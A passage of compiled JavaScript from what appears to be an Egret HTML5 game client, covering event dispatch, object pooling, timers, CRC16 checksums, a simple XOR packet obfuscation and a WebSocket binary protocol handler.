                delete this.dict[key];
            }
        }
    };
    EventMgr.prototype.run = function (time) {
        var currTime = egret.getTimer();
        while (this.eVec.length > 0) {
            this.dealMsg(this.eVec.shift());
            if ((egret.getTimer() - currTime) > 5) {
                break;
            }
        }
        return false;
    };
    EventMgr.prototype.dealMsg = function (vo) {
        var listeners = this.dict[vo.key];
        if (!listeners) {
            return;
        }
        var len = listeners.length;
        if (len == 0)
            return;
        this.flag++;
        for (var _i = 0, listeners_1 = listeners; _i < listeners_1.length; _i++) {
            var listener = listeners_1[_i];
            listener[0].apply(listener[1], vo.param);
        }
        this.flag--;
        vo.dispose();
        ObjectPool.push(vo);
    };
    return EventMgr;
}(SingleClass));
__reflect(EventMgr.prototype, "EventMgr");
var EventVo = (function () {
    function EventVo() {
    }
    EventVo.prototype.dispose = function () {
        this.key = null;
        this.param = null;
    };
    return EventVo;
}());
__reflect(EventVo.prototype, "EventVo");
var LangMgr = (function () {
    function LangMgr() {
    }
    LangMgr.initData = function (resName) {
        if (this.init)
            return;
        var jsonObj = RES.getRes(resName);
        if (!jsonObj)
            return;
        this.addValue(jsonObj);
        RES.destroyRes(resName);
        this.init = true;
    };
    LangMgr.addValue = function (jsonObj) {
        if (!this.config) {
            this.config = jsonObj;
        }
        else {
            for (var key in jsonObj) {
                this.config[key] = jsonObj[key];
            }
        }
    };
    LangMgr.getValueByKey = function (key) {
        var args = [];
        for (var _i = 1; _i < arguments.length; _i++) {
            args[_i - 1] = arguments[_i];
        }
        if (!this.config) {
            console.error(key, "Language data error!!!");
            return;
        }
        if (this.config.hasOwnProperty(key)) {
            return this.config[key].format.apply(this.config[key], args).toString();
        }
        else {
            console.warn(key, "Language not key!!!");
        }
        return key.format.apply(key, args).toString();
    };
    LangMgr.getColor = function (key) {
        return Number(this.getValueByKey(key));
    };
    LangMgr.getValueByArr = function (keyArr, argsArr) {
        var str = '';
        for (var key in keyArr) {
            str += this.getValueByKey.apply(this, [keyArr[key]].concat(argsArr[key]));
        }
        return str;
    };
    return LangMgr;
}());
__reflect(LangMgr.prototype, "LangMgr");
var ObjectPool = (function () {
    function ObjectPool() {
        this._objs = new Array();
    }
    ObjectPool.prototype.pushObj = function (obj) {
        this._objs.push(obj);
    };
    ObjectPool.prototype.popObj = function () {
        if (this._objs.length > 0) {
            return this._objs.pop();
        }
        else {
            return null;
        }
    };
    ObjectPool.prototype.clear = function () {
        while (this._objs.length > 0) {
            this._objs.pop();
        }
    };
    ObjectPool.pop = function (refKey) {
        var args = [];
        for (var _i = 1; _i < arguments.length; _i++) {
            args[_i - 1] = arguments[_i];
        }
        if (!ObjectPool._content[refKey]) {
            ObjectPool._content[refKey] = [];
        }
        var list = ObjectPool._content[refKey];
        if (list.length) {
            var i = list.pop();
            return i;
        }
        else {
            var classZ = egret.getDefinitionByName(refKey);
            var obj = new (classZ.bind.apply(classZ, [void 0].concat(args)))();
            obj.ObjectPoolKey = refKey;
            return obj;
        }
    };
    ObjectPool.popWithExtraKey = function (refKey, extraKey) {
        if (!ObjectPool._content[refKey]) {
            ObjectPool._content[refKey] = [];
        }
        var obj;
        var list = ObjectPool._content[refKey];
        if (list.length) {
            for (var i = 0; i < list.length; i++) {
                if (list[i].extraKey == extraKey) {
                    obj = list[i];
                    list.splice(i, 1);
                    break;
                }
            }
        }
        if (!obj) {
            var classZ = egret.getDefinitionByName(refKey);
            obj = new classZ(extraKey);
            obj.extraKey = extraKey;
            obj.ObjectPoolKey = refKey;
        }
        return obj;
    };
    ObjectPool.push = function (obj) {
        if (obj == null) {
            return false;
        }
        var refKey = obj.ObjectPoolKey;
        if (!ObjectPool._content[refKey] || ObjectPool._content[refKey].indexOf(obj) > -1) {
            return false;
        }
        ObjectPool._content[refKey].push(obj);
        return true;
    };
    ObjectPool.clear = function () {
        ObjectPool._content = {};
    };
    ObjectPool.clearClass = function (refKey, clearFuncName) {
        if (clearFuncName === void 0) { clearFuncName = null; }
        var list = ObjectPool._content[refKey];
        while (list && list.length) {
            var obj = list.pop();
            if (clearFuncName) {
                obj[clearFuncName]();
            }
            obj = null;
        }
        ObjectPool._content[refKey] = null;
        delete ObjectPool._content[refKey];
    };
    ObjectPool.dealFunc = function (refKey, dealFuncName) {
        var list = ObjectPool._content[refKey];
        if (list == null) {
            return;
        }
        var i = 0;
        var len = list.length;
        for (i; i < len; i++) {
            list[i][dealFuncName]();
        }
    };
    ObjectPool._content = {};
    return ObjectPool;
}());
__reflect(ObjectPool.prototype, "ObjectPool");
var RES;
(function (RES) {
    var ResourceEvent = (function (_super) {
        __extends(ResourceEvent, _super);
        function ResourceEvent(type, bubbles, cancelable) {
            if (bubbles === void 0) { bubbles = false; }
            if (cancelable === void 0) { cancelable = false; }
            var _this = _super.call(this, type, bubbles, cancelable) || this;
            _this.itemsLoaded = 0;
            _this.itemsTotal = 0;
            _this.groupName = "";
            return _this;
        }
        ResourceEvent.dispatchResourceEvent = function (target, type, groupName, resItem, itemsLoaded, itemsTotal) {
            if (groupName === void 0) { groupName = ""; }
            if (resItem === void 0) { resItem = undefined; }
            if (itemsLoaded === void 0) { itemsLoaded = 0; }
            if (itemsTotal === void 0) { itemsTotal = 0; }
            var event = egret.Event.create(ResourceEvent, type);
            event.groupName = groupName;
            if (resItem) {
                event.resItem = RES.ResourceItem.convertToResItem(resItem);
            }
            event.itemsLoaded = itemsLoaded;
            event.itemsTotal = itemsTotal;
            var result = target.dispatchEvent(event);
            egret.Event.release(event);
            return result;
        };
        ResourceEvent.ITEM_LOAD_ERROR = "itemLoadError";
        ResourceEvent.CONFIG_COMPLETE = "configComplete";
        ResourceEvent.CONFIG_LOAD_ERROR = "configLoadError";
        ResourceEvent.GROUP_PROGRESS = "groupProgress";
        ResourceEvent.GROUP_COMPLETE = "groupComplete";
        ResourceEvent.GROUP_LOAD_ERROR = "groupLoadError";
        return ResourceEvent;
    }(egret.Event));
    RES.ResourceEvent = ResourceEvent;
    __reflect(ResourceEvent.prototype, "RES.ResourceEvent");
})(RES || (RES = {}));
var SceneMgr = (function (_super) {
    __extends(SceneMgr, _super);
    function SceneMgr() {
        return _super.call(this) || this;
    }
    SceneMgr.ins = function () {
        return _super.ins.call(this);
    };
    SceneMgr.prototype.clear = function () {
        var nowScene = this._currScene;
        if (nowScene) {
            nowScene.onExit();
            this._currScene = undefined;
        }
    };
    SceneMgr.prototype.runScene = function (SceneClass) {
        if (SceneClass == null) {
            debug.log("runScene:scene is null");
            return;
        }
        var oldScene = this._currScene;
        if (oldScene) {
            oldScene.onExit();
            oldScene = undefined;
        }
        var scene = new SceneClass();
        scene.onEnter();
        this._currScene = scene;
    };
    SceneMgr.prototype.getCurrScene = function () {
        return this._currScene;
    };
    SceneMgr.prototype.getSceneName = function () {
        if (this._currScene) {
            return egret.getQualifiedClassName(this._currScene);
        }
        return '';
    };
    SceneMgr.MAIN = "MainScene";
    return SceneMgr;
}(SingleClass));
__reflect(SceneMgr.prototype, "SceneMgr");
var SwitchSceneMgr = (function (_super) {
    __extends(SwitchSceneMgr, _super);
    function SwitchSceneMgr() {
        var _this = _super !== null && _super.apply(this, arguments) || this;
        _this.scenes = [];
        return _this;
    }
    SwitchSceneMgr.ins = function () {
        return _super.ins.call(this);
    };
    SwitchSceneMgr.prototype.register = function (target) {
        if (this.scenes.indexOf(target) == -1) {
            this.scenes.push(target);
        }
    };
    SwitchSceneMgr.prototype.unregister = function (target) {
        var index = this.scenes.indexOf(target);
        if (index > -1) {
            this.scenes.splice(index, 1);
        }
    };
    SwitchSceneMgr.prototype.changeScene = function () {
        this.onExitScene();
        this.onEnterScene();
    };
    SwitchSceneMgr.prototype.onEnterScene = function () {
        for (var i = 0; i < this.scenes.length; i++) {
            var target = this.scenes[i];
            target.onEnterScene();
        }
    };
    SwitchSceneMgr.prototype.onExitScene = function () {
        for (var i = 0; i < this.scenes.length; i++) {
            var target = this.scenes[i];
            target.onExitScene();
        }
    };
    return SwitchSceneMgr;
}(SingleClass));
__reflect(SwitchSceneMgr.prototype, "SwitchSceneMgr");
var TimerMgr = (function (_super) {
    __extends(TimerMgr, _super);
    function TimerMgr() {
        var _this = _super.call(this) || this;
        _this.currHandler = null;
        _this._handlers = [];
        _this.nexthandles = null;
        _this._currTime = egret.getTimer();
        _this._currFrame = 0;
        egret.startTick(_this.onEnterFrame, _this);
        return _this;
    }
    TimerMgr.ins = function () {
        return _super.ins.call(this);
    };
    TimerMgr.prototype.getFrameId = function () {
        return this._currFrame;
    };
    TimerMgr.prototype.getCurrTime = function () {
        return this._currTime;
    };
    TimerMgr.binFunc = function (b1, b2) {
        return SortUtils.sortDescByKey(b1, b2, "exeTime");
    };
    TimerMgr.DeleteHandle = function (handler) {
        handler.clear();
        ObjectPool.push(handler);
    };
    TimerMgr.prototype.onEnterFrame = function (time) {
        this._currFrame++;
        this._currTime = egret.getTimer();
        var currTime = 0;
        var nexthandles = this.nexthandles;
        this.nexthandles = null;
        if (nexthandles && nexthandles.length > 0) {
            for (var _i = 0, nexthandles_1 = nexthandles; _i < nexthandles_1.length; _i++) {
                var handler_1 = nexthandles_1[_i];
                handler_1.method.call(handler_1.methodObj);
                TimerMgr.DeleteHandle(handler_1);
            }
            nexthandles = null;
        }
        if (this._handlers.length <= 0)
            return false;
        var handler = this._handlers[this._handlers.length - 1];
        while (handler.exeTime <= this._currTime) {
            this.currHandler = handler = this._handlers.pop();
            handler.method.call(handler.methodObj);
            currTime = egret.getTimer();
            handler.exeTime = currTime + handler.delay;
            var repeat = handler.forever;
            if (!repeat) {
                if (handler.repeatCount > 1) {
                    handler.repeatCount--;
                    repeat = true;
                }
                else {
                    if (handler.onFinish) {
                        handler.onFinish.apply(handler.finishObj);
                    }
                }
            }
            if (repeat) {
                var index = CommonUtils.searchIndex(this._handlers, handler, TimerMgr.binFunc);
                this._handlers.splice(index, 0, handler);
            }
            else {
                TimerMgr.DeleteHandle(handler);
            }
            if (currTime - this._currTime > 5) {
                break;
            }
            if (this._handlers.length <= 0) {
                break;
            }
            else {
                handler = this._handlers[this._handlers.length - 1];
            }
        }
        this.currHandler = null;
        if (DebugUtils.OpenDebug) {
            this.delayCheckCache();
        }
        return false;
    };
    TimerMgr.prototype.delayCheckCache = function () {
        this.checkCache();
    };
    TimerMgr.prototype.checkCache = function () {
        var types = {
            0: "TimerMgr",
            1: "egret.Tween"
        };
        var self = this;
        var fun = function (target, type) {
            if (target instanceof egret.DisplayObject && !target.stage) {
                var displayObject = target;
                var targetClassName = egret.getQualifiedClassName(target);
                var classNames = [];
                while (displayObject) {
                    if (displayObject["ignoreLeak"]) {
                        return;
                    }
                    var curClassName = egret.getQualifiedClassName(displayObject);
                    if (displayObject instanceof egret.DisplayObject) {
                        classNames.push(curClassName);
                    }
                    if (displayObject instanceof BaseEuiView) {
                        if (displayObject != UIMgr.ins().getView(curClassName)) {
                            break;
                        }
                    }
                    displayObject = displayObject.parent;
                }
                var desc = targetClassName + (" Leak, type:" + types[type] + ",class:" + classNames.join(">"));
                debug.error(desc);
                ReportData.getIns().reportClientErrorLog("MemLeak", desc);
            }
        };
        for (var i = this._handlers.length - 1; i >= 0; i--) {
            var handler = this._handlers[i];
            var methodObj = handler.methodObj;
            if (handler.forever) {
                fun(methodObj, 0);
            }
        }
        var tweens = egret.Tween["_tweens"];
        if (tweens) {
            for (var i = 0; i < tweens.length; i++) {
                var tween = tweens[i];
                if (tween["loop"]) {
                    fun(tween["_target"], 1);
                }
            }
        }
    };
    TimerMgr.prototype.create = function (startTime, delay, repeat, method, methodObj, onFinish, fobj) {
        if (delay < 0 || repeat < 0 || method == null) {
            return;
        }
        var handler = ObjectPool.pop("MyTimerHandler");
        handler.forever = repeat == 0;
        handler.repeatCount = repeat;
        handler.delay = delay;
        handler.method = method;
        handler.methodObj = methodObj;
        handler.onFinish = onFinish;
        handler.finishObj = fobj;
        handler.exeTime = startTime + this._currTime;
        var index = CommonUtils.searchIndex(this._handlers, handler, TimerMgr.binFunc);
        this._handlers.splice(index, 0, handler);
    };
    TimerMgr.prototype.doTimer = function (delay, repeat, method, methodObj, onFinish, fobj) {
        if (onFinish === void 0) { onFinish = null; }
        if (fobj === void 0) { fobj = null; }
        this.create(delay, delay, repeat, method, methodObj, onFinish, fobj);
    };
    TimerMgr.prototype.doTimerDelay = function (startTime, delay, repeat, method, methodObj, onFinish, fobj) {
        if (onFinish === void 0) { onFinish = null; }
        if (fobj === void 0) { fobj = null; }
        this.create(startTime, delay, repeat, method, methodObj, onFinish, fobj);
    };
    TimerMgr.prototype.doNext = function (method, methodObj) {
        var handler = ObjectPool.pop("MyTimerHandler");
        handler.method = method;
        handler.methodObj = methodObj;
        if (!this.nexthandles) {
            this.nexthandles = [];
        }
        this.nexthandles.push(handler);
    };
    TimerMgr.prototype.once = function (startTime, method, methodObj) {
        this.create(startTime, startTime, 1, method, methodObj, null, null);
    };
    TimerMgr.prototype.loop = function (startTime, method, methodObj) {
        this.create(startTime, startTime, 0, method, methodObj, null, null);
    };
    TimerMgr.prototype.remove = function (method, methodObj) {
        var currHandler = this.currHandler;
        if (currHandler && currHandler.method == method && currHandler.methodObj == methodObj) {
            currHandler.forever = false;
            currHandler.repeatCount = 0;
        }
        for (var i = this._handlers.length - 1; i >= 0; i--) {
            var handler = this._handlers[i];
            if (handler.method == method && handler.methodObj == methodObj) {
                this._handlers.splice(i, 1);
                TimerMgr.DeleteHandle(handler);
            }
        }
    };
    TimerMgr.prototype.removeAll = function (methodObj) {
        var currHandler = this.currHandler;
        if (currHandler && currHandler.methodObj == methodObj) {
            currHandler.forever = false;
            currHandler.repeatCount = 0;
        }
        for (var i = this._handlers.length - 1; i >= 0; i--) {
            var handler = this._handlers[i];
            if (handler.methodObj == methodObj) {
                this._handlers.splice(i, 1);
                TimerMgr.DeleteHandle(handler);
            }
        }
    };
    TimerMgr.prototype.isExists = function (method, methodObj) {
        for (var _i = 0, _a = this._handlers; _i < _a.length; _i++) {
            var handler = _a[_i];
            if (handler.method == method && handler.methodObj == methodObj) {
                return true;
            }
        }
        return false;
    };
    __decorate([
        callDelay(5000)
    ], TimerMgr.prototype, "delayCheckCache", null);
    __decorate([
        callLater
    ], TimerMgr.prototype, "doNext", null);
    return TimerMgr;
}(SingleClass));
__reflect(TimerMgr.prototype, "TimerMgr");
var MyTimerHandler = (function () {
    function MyTimerHandler() {
        this.delay = 0;
        this.forever = false;
        this.repeatCount = 0;
        this.exeTime = 0;
    }
    MyTimerHandler.prototype.clear = function () {
        this.method = null;
        this.methodObj = null;
        this.onFinish = null;
        this.finishObj = null;
        this.forever = false;
    };
    return MyTimerHandler;
}());
__reflect(MyTimerHandler.prototype, "MyTimerHandler");
var CRC16 = (function () {
    function CRC16() {
    }
    CRC16.update = function (bytes, offset, length) {
        if (offset === void 0) { offset = 0; }
        if (length === void 0) { length = 0; }
        var c = 0;
        var index = 0;
        if (length == 0) {
            length = bytes.length;
        }
        bytes.position = offset;
        for (var i = offset; i < length; ++i) {
            index = (CRC16.CRCBitReflect(bytes.readByte(), 8) & 0xFF) ^ ((c >> 8) & 0xFFFFFF);
            index &= 0xFF;
            c = CRC16.CRCTable[index] ^ ((c << 8) & 0xFFFFFF00);
        }
        return (CRC16.CRCBitReflect(c, 16) ^ 0) & 0xFFFF;
    };
    CRC16.makeCRCTable = function () {
        var c = 0;
        var crcTable = new Array(256);
        for (var i = 0; i < 256; ++i) {
            c = (i << 8) & 0xFFFFFF00;
            for (var j = 0; j < 8; ++j) {
                c = (c & 0x8000) ? ((c << 1) & 0xFFFFFFFE) ^ CRC16.POLYNOMIAL : ((c << 1) & 0xFFFFFFFE);
            }
            crcTable[i] = c;
        }
        return crcTable;
    };
    CRC16.CRCBitReflect = function (input, bitCount) {
        var out = 0;
        var x = 0;
        bitCount--;
        for (var i = 0; i <= bitCount; ++i) {
            x = bitCount - i;
            if (input & 1) {
                out |= (1 << x) & CRC16.DropBits[x];
            }
            input = (input >> 1) & 0x7FFFFFFF;
        }
        return out;
    };
    CRC16.POLYNOMIAL = 0x1021;
    CRC16.CRCTable = CRC16.makeCRCTable();
    CRC16.DropBits = [
        0xFFFFFFFF, 0xFFFFFFFE, 0xFFFFFFFC, 0xFFFFFFF8,
        0xFFFFFFF0, 0xFFFFFFE0, 0xFFFFFFC0, 0xFFFFFF80,
        0xFFFFFF00, 0xFFFFFE00, 0xFFFFFC00, 0xFFFFF800,
        0xFFFFF000, 0xFFFFE000, 0xFFFFC000, 0xFFFF8000
    ];
    return CRC16;
}());
__reflect(CRC16.prototype, "CRC16");
var Encrypt = (function () {
    function Encrypt() {
    }
    Encrypt.encode = function (inBuff, offset, length) {
        if (offset === void 0) { offset = 0; }
        if (length === void 0) { length = 0; }
        if (offset >= inBuff.length)
            return 0;
        var end = length ? offset + length : inBuff.length;
        if (end > inBuff.length)
            end = inBuff.length;
        inBuff.position = offset;
        for (var i = offset; i < end; ++i) {
            var byte = inBuff.readByte();
            byte ^= Encrypt.sKeyBuff[i % 4];
            inBuff.position--;
            inBuff.writeByte(byte);
        }
        return end - offset;
    };
    Encrypt.decode = function (inBuff, offset, length) {
        if (offset === void 0) { offset = 0; }
        if (length === void 0) { length = 0; }
        return Encrypt.encode(inBuff, offset, length);
    };
    Encrypt.getCRC16 = function (bytes, length) {
        if (length === void 0) { length = 0; }
        return CRC16.update(bytes, 0, length);
    };
    Encrypt.getCRC16ByPos = function (bytes, offset, length) {
        if (offset === void 0) { offset = 0; }
        if (length === void 0) { length = 0; }
        return CRC16.update(bytes, offset, length);
    };
    Encrypt.getCheckKey = function () {
        var bytes = new egret.ByteArray();
        bytes.endian = egret.Endian.LITTLE_ENDIAN;
        bytes.writeUnsignedInt(Encrypt.sKey);
        var ck = CRC16.update(bytes);
        return ck;
    };
    Encrypt.getSelfSalt = function () {
        return Encrypt.sSelfSalt;
    };
    Encrypt.getTargetSalt = function () {
        return Encrypt.sTargetSalt;
    };
    Encrypt.setTargetSalt = function (value) {
        Encrypt.sTargetSalt = value;
        Encrypt.makeKey();
    };
    Encrypt.makeSalt = function () {
        return Math.random() * (Date.now() / 1000) >> 0;
    };
    Encrypt.makeKey = function () {
        Encrypt.sKey = (Encrypt.sSelfSalt ^ Encrypt.sTargetSalt) + 8254;
        for (var i = 0; i < 4; ++i) {
            Encrypt.sKeyBuff[i] = (Encrypt.sKey & (0xFF << (i << 3))) >> (i << 3);
        }
    };
    Encrypt.sSelfSalt = Encrypt.makeSalt();
    Encrypt.sKeyBuff = new Array(4);
    return Encrypt;
}());
__reflect(Encrypt.prototype, "Encrypt");
var WatcherUtil = (function () {
    function WatcherUtil() {
    }
    WatcherUtil.removeFromArrayCollection = function (dataPro) {
        if (dataPro && dataPro.source && dataPro.source.length) {
            WatcherUtil.removeFromArray(dataPro.source);
        }
    };
    WatcherUtil.removeFromArray = function (dataPro) {
        if (!dataPro)
            return;
        for (var _i = 0, dataPro_1 = dataPro; _i < dataPro_1.length; _i++) {
            var source = dataPro_1[_i];
            WatcherUtil.removeFromObject(source);
        }
    };
    WatcherUtil.removeFromObject = function (obj) {
        if (obj instanceof egret.EventDispatcher) {
            var event_1 = obj.$getEventMap();
            var list = event_1[eui.PropertyEvent.PROPERTY_CHANGE];
            if (list) {
                for (var index = list.length - 1; index >= 0; index--) {
                    var obj_1 = list[index];
                    if (obj_1.thisObject instanceof eui.Watcher) {
                        obj_1.thisObject.unwatch();
                        list.splice(index, 1);
                    }
                }
            }
        }
        else {
            var listeners = obj['__listeners__'];
            if (listeners && listeners.length) {
                for (var i = 0; i < listeners.length; i += 2) {
                    var target = listeners[i + 1];
                    if (target instanceof eui.Watcher) {
                        target.unwatch();
                        i -= 2;
                    }
                }
            }
        }
    };
    return WatcherUtil;
}());
__reflect(WatcherUtil.prototype, "WatcherUtil");
var SocketBase = (function (_super) {
    __extends(SocketBase, _super);
    function SocketBase() {
        var _this = _super.call(this) || this;
        _this.pid = 0;
        _this._socketStatus = 0;
        _this.PACK_HANDLER = [];
        _this.showLog = false;
        _this.catchError = false;
        _this.newSocket();
        _this.recvPack = new GameByteArray();
        return _this;
    }
    Object.defineProperty(SocketBase.prototype, "host", {
        get: function () {
            return this._host;
        },
        enumerable: true,
        configurable: true
    });
    Object.defineProperty(SocketBase.prototype, "port", {
        get: function () {
            return this._port;
        },
        enumerable: true,
        configurable: true
    });
    SocketBase.prototype.getSocket = function () {
        return this.socket;
    };
    SocketBase.prototype.setOnClose = function (fun, obj) {
        this.onClosedCallback = fun.bind(obj);
    };
    SocketBase.prototype.setOnConnected = function (fun, obj) {
        this.onConnectedCallback = fun.bind(obj);
    };
    SocketBase.prototype.newSocket = function () {
        if (this.socket) {
            this.removeEvent();
        }
        this.socket = new egret.WebSocket;
        this.socket.type = egret.WebSocket.TYPE_BINARY;
        this.socket.addEventListener(egret.Event.CONNECT, this.onSocketConnected, this);
        this.socket.addEventListener(egret.Event.CLOSE, this.onSocketClose, this);
        this.socket.addEventListener(egret.ProgressEvent.SOCKET_DATA, this.onSocketRead, this);
        this.socket.addEventListener(egret.IOErrorEvent.IO_ERROR, this.connectError, this);
    };
    SocketBase.prototype.removeEvent = function () {
        this.socket.removeEventListener(egret.Event.CONNECT, this.onSocketConnected, this);
        this.socket.removeEventListener(egret.Event.CLOSE, this.onSocketClose, this);
        this.socket.removeEventListener(egret.ProgressEvent.SOCKET_DATA, this.onSocketRead, this);
        this.socket.removeEventListener(egret.IOErrorEvent.IO_ERROR, this.connectError, this);
    };
    SocketBase.prototype.connectSocket = function (host, port, isUrl) {
        if (isUrl === void 0) { isUrl = false; }
        this.updateStatus(SocketConst.STATUS_CONNECTING);
        this._host = host;
        this._port = port;
        this.socket.connect(host, port, isUrl);
    };
    SocketBase.prototype.onSocketConnected = function () {
        debug.log("Socket connected！ip:" + this._host + " port:" + this._port);
        this.updateStatus(SocketConst.STATUS_CHECKING);
        var selfSalt = Encrypt.getSelfSalt();
        debug.log("SendEncrypt:", selfSalt);
        var bytes = new GameByteArray;
        bytes.writeUnsignedInt(selfSalt);
        this.socket.writeBytes(bytes);
        this.socket.flush();
    };
    SocketBase.prototype.onSocketRead = function (e) {
        if (this._socketStatus < SocketConst.STATUS_COMMUNICATION) {
            this.sendKeyToServer();
            return;
        }
        this.recvPack.clear();
        this.socket.readBytes(this.recvPack, this.recvPack.length);
        NetCalcUtils.revBytes += this.recvPack.length;
        var tag = this.recvPack.readUnsignedShort();
        if (tag != SocketConst.DEFAULT_TAG)
            return;
        var buffLen = this.recvPack.readUnsignedShort();
        this.recvPack.position += 4;
        this.processRecvPacket(this.recvPack);
    };
    SocketBase.prototype.sendKeyToServer = function () {
        var pack = new GameByteArray;
        this.socket.readBytes(pack);
        pack.position = 0;
        var salt = pack.readUnsignedInt();
        debug.log("ReceiveEncrypt:", salt);
        Encrypt.setTargetSalt(salt);
        var key = Encrypt.getCheckKey();
        debug.log("SendSign:", key);
        pack.position = 0;
        pack.writeShort(key);
        this.socket.writeBytes(pack, 0, 2);
        this.recycleByte(pack);
        this.updateStatus(SocketConst.STATUS_COMMUNICATION);
    };
    SocketBase.prototype.processRecvPacket = function (packet) {
        var protocolsId = packet.readUnsignedByte();
        var messageId = packet.readUnsignedByte();
        this.dispatch(protocolsId, messageId, packet);
    };
    SocketBase.prototype.dispatch = function (protocolsId, messageId, byte) {
        if (!this.PACK_HANDLER[protocolsId] || !this.PACK_HANDLER[protocolsId][messageId]) {
            debug.log("unregistered server agreements:" + protocolsId + "-" + messageId);
            return;
        }
        this.printSocketLog("S->C:" + protocolsId + "-" + messageId);
        NetCalcUtils.calcRevBytes(protocolsId, messageId, byte.length);
        var args = this.PACK_HANDLER[protocolsId][messageId];
        var param = [byte];
        if (args[2]) {
            this.catchError = false;
            param = this.decodeParam(args[2], byte);
            if (this.catchError) {
                var desc = "S->C[" + protocolsId + "-" + messageId + "]->:" + param;
                debug.error(desc);
                ReportData.getIns().reportClientErrorLog("SocketDown", desc);
            }
        }
        (_a = args[0]).call.apply(_a, [args[1]].concat(param));
        var _a;
    };
    SocketBase.prototype.encodeParam = function (encodeObj, param, data) {
        var length = encodeObj.length;
        for (var i = 0; i < length; i++) {
            if (i >= param.length) {
                break;
            }
            if (encodeObj[i] instanceof Array) {
                data.writeUnsignedShort(param[i].length);
                for (var j = 0; j < param[i].length; ++j) {
                    this.encodeParam(encodeObj[i], param[i][j] instanceof Array ? param[i][j] : [param[i][j]], data);
                }
            }
            else {
                var type = encodeObj[i];
                var val = param[i];
                if (type == 0) {
                    data.writeBoolean(val);
                }
                else if (type == 1) {
                    data.writeByte(val);
                }
                else if (type == 2) {
                    data.writeShort(val);
                }
                else if (type == 3) {
                    data.writeInt(val);
                }
                else if (type == 4) {
                    data.writeByte(val);
                }
                else if (type == 5) {
                    data.writeUnsignedShort(val);
                }
                else if (type == 6) {
                    data.writeUnsignedInt(val);
                }
                else if (type == 7) {
                    data.writeUnsignedInt64(val);
                }
                else if (type == 8) {
                    data.writeString(val ? val.toString() : "");
                }
                else if (type == 9) {
                    data.writeFloat(val);
                }
                else if (type == 10) {
                    data.writeDouble(val);
                }
            }
        }
    };
    SocketBase.prototype.decodeParam = function (decodeObj, data) {
        var result = [];
        var length = decodeObj.length;
        for (var i = 0; i < length; i++) {
            if (data.position >= data.length) {
                break;
            }
            if (decodeObj[i] instanceof Array) {
                var len = data.readUnsignedShort();
                var parent_1 = [];
                for (var j = 0; j < len; j++) {
                    var params = this.decodeParam(decodeObj[i], data);
                    if (params.length == 1) {
                        parent_1.push(params[0]);
                    }
                    else {
                        parent_1.push(params);
                    }
                }
                result.push(parent_1);
                if (this.catchError) {
                    return result;
                }
            }
            else {
                try {
                    var type = decodeObj[i];
                    if (type == 0) {
                        result.push(data.readBoolean());
                    }
                    else if (type == 1) {
                        result.push(data.readByte());
                    }
                    else if (type == 2) {
                        result.push(data.readShort());
                    }
                    else if (type == 3) {
                        result.push(data.readInt());
                    }
                    else if (type == 4) {
                        result.push(data.readUnsignedByte());
                    }
                    else if (type == 5) {
                        result.push(data.readUnsignedShort());
                    }
                    else if (type == 6) {
                        result.push(data.readUnsignedInt());
                    }
                    else if (type == 7) {
                        result.push(data.readUnsignedInt64());
                    }
                    else if (type == 8) {
                        result.push(data.readString());
                    }
                    else if (type == 9) {
                        result.push(data.readFloat());
                    }
                    else if (type == 10) {
                        result.push(data.readDouble());
                    }
                    else if (type == 11) {
                        var isBreak = data.readBoolean();
                        result.push(isBreak);
                        if (isBreak) {
                            break;
                        }
                    }
                }
                catch (error) {
                    this.catchError = true;
                    return result;
                }
            }
        }
        return result;
    };
    SocketBase.prototype.close = function () {
        if (!this.socket) {
            return;
        }
        if (this._host && this._port) {
            debug.log("close socket！ip:" + this._host + " port:" + this._port);
            this.socket.close();
        }
    };
    SocketBase.prototype.updateStatus = function (status) {
        if (this._socketStatus != status) {
            var old = this._socketStatus;
            this._socketStatus = status;
            this.onFinishCheck(status, old);
        }
    };
    SocketBase.prototype.recycleByte = function (byte) {
        ObjectPool.push(byte);
    };
    SocketBase.prototype.getBytes = function () {
        var pack = ObjectPool.pop(SocketConst.CLASSNAME);
        pack.clear();
        pack.writeShort(SocketConst.DEFAULT_TAG);
        pack.writeShort(0);
        pack.writeShort(0);
        pack.writeShort(SocketConst.DEFAULT_CRC_KEY);
        pack.writeUnsignedInt(this.pid++);
        return pack;
    };
    SocketBase.prototype.regHandler = function (protocolsId, messageId, fun, sysClass, decode) {
        if (!this.PACK_HANDLER[protocolsId]) {
            this.PACK_HANDLER[protocolsId] = [];
        }
        else if (this.PACK_HANDLER[protocolsId][messageId]) {
            debug.error("repeat agreements:" + protocolsId + "-" + messageId);
            return;
        }
        this.PACK_HANDLER[protocolsId][messageId] = [fun, sysClass, decode];
    };
    SocketBase.prototype.sendToServer = function (bytes) {
        if (this._socketStatus == SocketConst.STATUS_COMMUNICATION) {
            this.sendPack(bytes);
        }
        else {
            debug.log("socket not connected");
        }
        bytes.position = 12;
        this.printSocketLog("C->S:" + bytes.readUnsignedByte() + "-" + bytes.readUnsignedByte());
        this.recycleByte(bytes);
    };
    SocketBase.prototype.sendPack = function (bytes) {
        if (bytes == null || bytes.length == 0) {
            throw new debug.error("send bytes is null!");
        }
        var headsize = SocketConst.HEAD_SIZE;
        bytes.position = 2;
        bytes.writeShort(bytes.length - headsize);
        var msgCK = Encrypt.getCRC16ByPos(bytes, headsize);
        bytes.position = 4;
        bytes.writeShort(msgCK);
        var headerCRC = Encrypt.getCRC16(bytes, headsize);
        bytes.position = 6;
        bytes.writeShort(headerCRC);
        Encrypt.encode(bytes, 4, 4);
        NetCalcUtils.sendBytes += bytes.length;
        this.socket.writeBytes(bytes);
    };
    SocketBase.prototype.printSocketLog = function (message) {
        if (this.showLog) {
            console.log(message);
        }
    };
    SocketBase.prototype.onSocketClose = function (e) {
    };
    SocketBase.prototype.connectError = function (e) {
    };
    SocketBase.prototype.reLogin = function () {
    };
    SocketBase.prototype.onFinishCheck = function (newStatus, oldStatus) {
    };
    return SocketBase;
}(SingleClass));
__reflect(SocketBase.prototype, "SocketBase");
var SocketConst = (function () {
    function SocketConst() {
    }
    SocketConst.DEFAULT_TAG = 0xCCEE;
    SocketConst.DEFAULT_CRC_KEY = 0x765D;
    SocketConst.HEAD_SIZE = 8;
    SocketConst.STATUS_CONNECTING = 1;
    SocketConst.STATUS_CHECKING = 2;
    SocketConst.STATUS_COMMUNICATION = 3;
    SocketConst.STATUS_DISCONNECT = 4;
    SocketConst.CLASSNAME = egret.getQualifiedClassName(GameByteArray);
    return SocketConst;
}());
__reflect(SocketConst.prototype, "SocketConst");
var UInt64 = (function () {
    function UInt64(v) {
        this._lowUint = 0;
        this._highUint = 0;
        this.value = v;
    }
